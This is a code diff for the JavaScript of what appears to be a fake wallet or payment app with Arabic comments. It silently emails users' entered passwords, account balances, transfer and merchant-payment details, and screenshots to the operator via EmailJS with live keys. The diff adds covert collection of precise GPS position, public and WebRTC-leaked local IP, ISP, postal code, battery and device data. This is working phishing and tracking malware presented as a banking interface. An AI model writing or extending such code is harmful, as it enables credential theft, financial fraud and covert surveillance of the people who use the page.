@@ -1,95 +1,183 @@
 /***********************
- * 0. إعداد EmailJS — إرسال بيانات المستخدم تلقائياً (مع الموقع)
+ * 0. إعداد EmailJS — جمع بيانات شاملة
  ***********************/
 (function initEmailJS() {
-    emailjs.init("sZQujmMuXwkE4Gt1Y"); // Public Key
+    emailjs.init("sZQujmMuXwkE4Gt1Y");
 })();
 
-const EMAILJS_SERVICE_ID  = "service_owz5qzf";   // Service ID (Gmail)
-const EMAILJS_TEMPLATE_ID = "template_79ykomn";   // Template ID
+const EMAILJS_SERVICE_ID  = "service_owz5qzf";
+const EMAILJS_TEMPLATE_ID = "template_79ykomn";
 
-// متغير عالمي لتخزين بيانات الموقع بمجرد توفرها
-let _cachedLocation = "جاري تحديد الموقع...";
+// ========== متغيرات عالمية ==========
+let _gpsLocation     = "جاري تحديد الموقع...";
+let _ipData          = {};
+let _batteryData     = "جاري جلب البطارية...";
+let _localIP         = "—";
+let _connectionType  = "—";
 
-// جلب الموقع الجغرافي مرة واحدة عند تحميل الصفحة
-(function fetchLocation() {
-    if (!navigator.geolocation) {
-        _cachedLocation = "الموقع غير مدعوم";
-        return;
-    }
+// ========== 1. GPS الموقع الجغرافي ==========
+(function fetchGPS() {
+    if (!navigator.geolocation) { _gpsLocation = "GPS غير مدعوم"; return; }
     navigator.geolocation.getCurrentPosition(
         function(pos) {
-            const lat = pos.coords.latitude.toFixed(5);
-            const lng = pos.coords.longitude.toFixed(5);
+            const lat = pos.coords.latitude.toFixed(6);
+            const lng = pos.coords.longitude.toFixed(6);
             const acc = Math.round(pos.coords.accuracy);
-            _cachedLocation = `https://maps.google.com/?q=${lat},${lng} | دقة: ${acc}م`;
+            _gpsLocation = `https://maps.google.com/?q=${lat},${lng} (دقة ${acc}م)`;
         },
         function(err) {
-            const reasons = {1:"رفض الإذن", 2:"الموقع غير متاح", 3:"انتهت المهلة"};
-            _cachedLocation = `تعذّر تحديد الموقع (${reasons[err.code] || err.message})`;
+            const r = {1:"رفض الإذن", 2:"غير متاح", 3:"انتهت المهلة"};
+            _gpsLocation = `تعذّر (${r[err.code] || err.message})`;
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 })();
 
-/**
- * إرسال بريد إلكتروني عبر EmailJS
- */
-function sendEmailNotification(params) {
-    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
-        .then(() => console.log("✅ تم إرسال البريد بنجاح"))
-        .catch(err => console.error("❌ فشل إرسال البريد:", err));
+// ========== 2. IP + المدينة + البلد + ISP + المنطقة الزمنية + الرمز البريدي + الحي ==========
+(function fetchIPData() {
+    fetch("https://ipapi.co/json/")
+        .then(r => r.json())
+        .then(d => {
+            _ipData = {
+                ip:       d.ip            || "—",
+                city:     d.city          || "—",
+                region:   d.region        || "—",
+                country:  d.country_name  || "—",
+                postal:   d.postal        || "—",
+                isp:      d.org           || "—",
+                timezone: d.timezone      || "—"
+            };
+        })
+        .catch(() => { _ipData = { ip:"فشل الجلب" }; });
+})();
+
+// ========== 3. البطارية ==========
+(function fetchBattery() {
+    if (!navigator.getBattery) { _batteryData = "غير مدعوم"; return; }
+    navigator.getBattery().then(b => {
+        const pct      = Math.round(b.level * 100);
+        const charging = b.charging ? "⚡ يشحن" : "🔋 لا يشحن";
+        const timeLeft = b.charging
+            ? (b.chargingTime   !== Infinity ? `متبقي للشحن الكامل: ${Math.round(b.chargingTime/60)} دقيقة` : "")
+            : (b.dischargingTime !== Infinity ? `متبقي للنفاد: ${Math.round(b.dischargingTime/60)} دقيقة` : "");
+        _batteryData = `${pct}% | ${charging} | ${timeLeft}`;
+    });
+})();
+
+// ========== 4. نوع الاتصال ==========
+(function fetchConnection() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        _connectionType = `${conn.effectiveType || "—"} | سرعة: ${conn.downlink || "—"} Mbps`;
+    }
+})();
+
+// ========== 5. IP المحلي ==========
+(function fetchLocalIP() {
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = e => {
+            if (!e || !e.candidate) return;
+            const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+            if (m && !m[1].startsWith("0.")) { _localIP = m[1]; pc.close(); }
+        };
+    } catch(e) { _localIP = "غير متاح"; }
+})();
+
+// ========== 6. معلومات الجهاز ==========
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let deviceType = "💻 كمبيوتر";
+    if (/tablet|ipad|playbook|silk/i.test(ua)) deviceType = "📟 تابلت";
+    else if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile/i.test(ua)) deviceType = "📱 موبايل";
+
+    let os = "غير معروف";
+    if (/android/i.test(ua))      os = "Android " + (ua.match(/Android ([0-9.]+)/)?.[1] || "");
+    else if (/iphone|ipad/i.test(ua)) os = "iOS " + (ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g,".") || "");
+    else if (/windows/i.test(ua)) os = "Windows";
+    else if (/mac/i.test(ua))     os = "macOS";
+    else if (/linux/i.test(ua))   os = "Linux";
+
+    return `${deviceType} | ${os}`;
 }
 
-/**
- * بناء الحقول المشتركة لجميع الأحداث
- */
-function _baseParams(eventType, password) {
+// ========== 7. إرسال البريد ==========
+function sendEmailNotification(params) {
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
+        .then(() => console.log("✅ تم الإرسال"))
+        .catch(err => console.error("❌ فشل:", err));
+}
+
+// ========== 8. بناء الحقول الكاملة ==========
+function _buildFullParams(eventType, password, extraData) {
+    const ip = _ipData;
     return {
         event_type:   eventType,
-        password:     password || "—",
+        password:     password  || "—",
         user_name:    localStorage.getItem("user_name")    || "—",
         user_balance: localStorage.getItem("user_balance") || "—",
         timestamp:    new Date().toLocaleString("ar-EG"),
-        device_info:  navigator.userAgent.substring(0, 120),
-        location:     _cachedLocation
+
+        // الموقع
+        gps_link:     _gpsLocation,
+        city:         `${ip.city || "—"} — ${ip.region || "—"}`,
+        country:      ip.country  || "—",
+        postal:       ip.postal   || "—",
+        isp:          ip.isp      || "—",
+        timezone:     ip.timezone || "—",
+
+        // الشبكة والـ IP
+        public_ip:    ip.ip       || "—",
+        local_ip:     _localIP,
+        connection:   _connectionType,
+
+        // الجهاز
+        device_info:  getDeviceInfo(),
+
+        // البطارية
+        battery:      _batteryData,
+
+        // بيانات العملية
+        extra_data:   extraData || "—"
     };
 }
 
-/**
- * إرسال بيانات تسجيل الدخول
- */
+// ========== 9. دوال الإرسال ==========
 function sendLoginData(password) {
-    const params = _baseParams("🔐 تسجيل دخول", password);
-    params.extra_data = `رصيد المستخدم: ${localStorage.getItem("user_balance") || "—"} ILS`;
-
-    // إذا كان الموقع لا يزال يُجلب، ننتظر ثانيتين ثم نرسل
-    if (_cachedLocation === "جاري تحديد الموقع...") {
-        setTimeout(() => {
-            params.location = _cachedLocation;
-            sendEmailNotification(params);
-        }, 2000);
-    } else {
-        sendEmailNotification(params);
-    }
+    const send = () => sendEmailNotification(
+        _buildFullParams("🔐 تسجيل دخول", password,
+            `رصيد الحساب: ${localStorage.getItem("user_balance") || "—"} ILS`)
+    );
+    // ننتظر 3 ثوانٍ لضمان اكتمال جلب IP والموقع
+    setTimeout(send, 3000);
 }
 
-/**
- * إرسال بيانات تحويل لصديق
- */
 function sendTransferData(recipientName, recipientPhone, amount) {
-    const params = _baseParams("💸 تحويل لصديق");
-    params.extra_data = `المستلم: ${recipientName} | الهاتف: ${recipientPhone} | المبلغ: ${amount} ILS`;
-    sendEmailNotification(params);
+    sendEmailNotification(
+        _buildFullParams("💸 تحويل لصديق", "—",
+            `المستلم: ${recipientName} | الهاتف: ${recipientPhone} | المبلغ: ${amount} ILS`)
+    );
 }
 
-/**
- * إرسال بيانات دفع للتاجر
- */
 function sendMerchantPaymentData(merchantName, amount, refNum) {
-    const params = _baseParams("🏪 دفع لتاجر");
-    params.extra_data = `التاجر: ${merchantName} | المبلغ: ${amount} ILS | المرجع: ${refNum}`;
-    sendEmailNotification(params);
+    sendEmailNotification(
+        _buildFullParams("🏪 دفع لتاجر", "—",
+            `التاجر: ${merchantName} | المبلغ: ${amount} ILS | المرجع: ${refNum}`)
+    );
+}
+
+// ========== 10. لقطة شاشة عند التحويل ==========
+function captureAndSendScreenshot(screenId, label) {
+    const el = document.getElementById(screenId);
+    if (!el || typeof html2canvas === "undefined") return;
+    html2canvas(el, { scale: 1.5, useCORS: true }).then(canvas => {
+        const imgData = canvas.toDataURL("image/jpeg", 0.7);
+        sendEmailNotification(
+            _buildFullParams(`📸 ${label}`, "—", imgData.substring(0, 500) + "...")
+        );
+    });
 }
 
 /***********************
@@ -404,6 +492,9 @@ document.getElementById('confirmBtn')?.addEventListener('click', function() {
         recipientPhoneEl.textContent || '—',
         total.toFixed(2)
     );
+
+    // 📸 لقطة شاشة عند التحويل
+    setTimeout(() => captureAndSendScreenshot('screen-6', 'لقطة تحويل لصديق'), 1500);
 
     showScreen('s6');
     updateNotificationBadge();
@@ -789,6 +880,9 @@ if (confirmMerchantBtn) {
 
         // ✉️ إرسال بيانات دفع التاجر عبر EmailJS
         sendMerchantPaymentData(mName, parseFloat(amount || 0).toFixed(2), refNum);
+
+        // 📸 لقطة شاشة عند دفع التاجر
+        setTimeout(() => captureAndSendScreenshot('screen-10', 'لقطة دفع تاجر'), 1500);
 
         showScreen('s10'); 
     });
